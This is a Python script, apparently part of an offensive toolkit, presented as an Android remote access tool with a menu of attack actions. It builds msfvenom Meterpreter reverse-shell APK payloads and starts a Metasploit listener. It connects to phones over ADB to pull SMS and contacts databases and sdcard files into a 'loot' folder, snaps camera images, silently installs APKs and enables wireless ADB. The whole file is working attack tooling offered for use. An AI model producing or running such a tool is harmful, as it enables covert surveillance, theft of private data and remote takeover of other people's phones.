#!/usr/bin/env python3
import os, sys, subprocess, shutil

RED="\033[91m"; YEL="\033[93m"; CYN="\033[96m"; GRN="\033[92m"
WHT="\033[97m"; DIM="\033[2m";  RST="\033[0m";  BOLD="\033[1m"

LOGO = f"""{RED}
  ██████╗  █████╗ ████████╗    █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗
  ██╔══██╗██╔══██╗╚══██╔══╝   ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗
  ██████╔╝███████║   ██║      ███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║  ██║
  ██╔══██╗██╔══██║   ██║      ██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║  ██║
  ██║  ██║██║  ██║   ██║      ██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║██████╔╝
  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝{RST}
{DIM}                    [ android remote access tool ]{RST}
"""

MENU = f"""
{YEL}┌──────────────────────────────────────────────────┐
│                {WHT}ANDROID RAT OPTIONS{YEL}               │
├──────────────────────────────────────────────────┤
│  {CYN}[1]{YEL} Generate APK payload (msfvenom)            │
│  {CYN}[2]{YEL} Start Metasploit listener                  │
│  {CYN}[3]{YEL} ADB shell connect (USB/WiFi)               │
│  {CYN}[4]{YEL} ADB exfil — pull SMS / contacts / files    │
│  {CYN}[5]{YEL} ADB camera snapshot                        │
│  {CYN}[6]{YEL} ADB install APK silently                   │
│  {CYN}[7]{YEL} ADB enable WiFi ADB (post USB)             │
│  {CYN}[0]{YEL} Back                                       │
└──────────────────────────────────────────────────┘{RST}
"""

def clear(): os.system("clear")

def sh(cmd): return os.popen(cmd).read().strip()

def require(tool):
    if not shutil.which(tool):
        print(f"{RED}[!] {tool} not found — install it first{RST}")
        return False
    return True

# ── handlers ──────────────────────────────────────────────────────────────────

def gen_apk():
    print(f"\n{CYN}[ APK PAYLOAD GENERATOR ]{RST}")
    lhost = input(f"  LHOST (your IP): ").strip()
    lport = input(f"  LPORT [4444]: ").strip() or "4444"
    out   = input(f"  output filename [payload.apk]: ").strip() or "payload.apk"
    cmd = (f"msfvenom -p android/meterpreter/reverse_tcp "
           f"LHOST={lhost} LPORT={lport} R > {out}")
    print(f"\n{DIM}  running: {cmd}{RST}\n")
    if require("msfvenom"):
        os.system(cmd)
        print(f"\n{GRN}[+] payload written to {out}{RST}")
    input(f"\n{DIM}press enter{RST}")

def msf_listener():
    print(f"\n{CYN}[ METASPLOIT LISTENER ]{RST}")
    lhost = input("  LHOST: ").strip()
    lport = input("  LPORT [4444]: ").strip() or "4444"
    rc = f"/tmp/syp_android.rc"
    with open(rc,"w") as f:
        f.write(f"use exploit/multi/handler\n"
                f"set payload android/meterpreter/reverse_tcp\n"
                f"set LHOST {lhost}\n"
                f"set LPORT {lport}\n"
                f"exploit\n")
    if require("msfconsole"):
        os.system(f"msfconsole -r {rc}")
    input(f"\n{DIM}press enter{RST}")

def adb_connect():
    print(f"\n{CYN}[ ADB CONNECT ]{RST}")
    target = input("  target IP:PORT (e.g. 192.168.1.5:5555): ").strip()
    if require("adb"):
        os.system(f"adb connect {target}")
        os.system("adb devices")
    input(f"\n{DIM}press enter{RST}")

def adb_exfil():
    print(f"\n{CYN}[ ADB EXFIL ]{RST}")
    if not require("adb"): input(); return
    os.makedirs("loot/android", exist_ok=True)
    print(f"{DIM}  pulling SMS db...{RST}")
    os.system("adb pull /data/data/com.android.providers.telephony/databases/mmssms.db loot/android/ 2>/dev/null")
    print(f"{DIM}  pulling contacts db...{RST}")
    os.system("adb pull /data/data/com.android.providers.contacts/databases/contacts2.db loot/android/ 2>/dev/null")
    print(f"{DIM}  listing sdcard...{RST}")
    listing = sh("adb shell ls /sdcard/")
    print(listing)
    pull = input(f"\n  pull sdcard path (blank=skip): ").strip()
    if pull:
        os.system(f"adb pull /sdcard/{pull} loot/android/")
    print(f"\n{GRN}[+] loot saved to loot/android/{RST}")
    input(f"\n{DIM}press enter{RST}")

def adb_camera():
    print(f"\n{CYN}[ ADB CAMERA SNAPSHOT ]{RST}")
    if not require("adb"): input(); return
    remote = "/sdcard/syp_snap.jpg"
    os.system(f"adb shell screencap -p {remote}")
    # try camera via am start + screencap fallback
    os.system(f"adb shell am start -a android.media.action.STILL_IMAGE_CAMERA 2>/dev/null")
    import time; time.sleep(2)
    os.system(f"adb shell input keyevent 27")   # KEYCODE_CAMERA
    time.sleep(1)
    os.makedirs("loot/android", exist_ok=True)
    os.system(f"adb pull {remote} loot/android/snap.jpg")
    print(f"{GRN}[+] saved to loot/android/snap.jpg{RST}")
    input(f"\n{DIM}press enter{RST}")

def adb_install():
    print(f"\n{CYN}[ ADB SILENT INSTALL ]{RST}")
    if not require("adb"): input(); return
    apk = input("  APK path: ").strip()
    os.system(f"adb install -r {apk}")
    input(f"\n{DIM}press enter{RST}")

def adb_wifi_enable():
    print(f"\n{CYN}[ ENABLE WIFI ADB ]{RST}")
    print(f"{DIM}  device must be connected via USB first{RST}")
    if not require("adb"): input(); return
    port = input("  port [5555]: ").strip() or "5555"
    os.system(f"adb tcpip {port}")
    ip = sh("adb shell ip route | awk '{print $9}' | head -1")
    print(f"\n{GRN}[+] connect with:  adb connect {ip}:{port}{RST}")
    input(f"\n{DIM}press enter{RST}")

ACTIONS = {
    "1": gen_apk,
    "2": msf_listener,
    "3": adb_connect,
    "4": adb_exfil,
    "5": adb_camera,
    "6": adb_install,
    "7": adb_wifi_enable,
}

def main():
    while True:
        clear()
        print(LOGO)
        print(MENU)
        c = input(f"{RED}rat-android{RST} {YEL}>{RST} ").strip()
        if c == "0": break
        if c in ACTIONS: ACTIONS[c]()
        else: input(f"{YEL}[?] invalid — enter{RST}")

if __name__ == "__main__":
    main()
